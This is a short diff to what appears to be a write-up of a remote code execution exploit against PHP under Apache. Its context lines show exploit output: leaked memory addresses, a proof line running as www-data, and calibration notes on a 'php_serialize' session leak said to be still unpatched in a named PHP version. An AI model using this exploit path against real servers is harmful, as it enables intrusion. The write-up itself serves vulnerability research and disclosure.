@@ -58,7 +58,7 @@ PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 (3/3 consecutive)
 ```
 
-Restart a fresh Apache master:
+After restarting the Apache master:
 
 ```text
 anchor 0x7fd3e7fb6309 hb 0x7fd3e6200000 lb 0x7fd3e7a00000 S 0x7fd3e6203780
@@ -90,7 +90,7 @@ PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ## Notes
 
 - The default `session.serialize_handler=php` has been fixed in GH-16590; the
-  leak uses the `php_serialize` sibling path (still present in 8.4.26).
+  leak uses the `php_serialize` sibling path (still vulnerable in 8.4.26).
 - `S_OFF=0x3780` is the measured value for "after two leak requests, the
   `dyn_payload.php` request"; changing the request order/scripts requires
   recalibration.
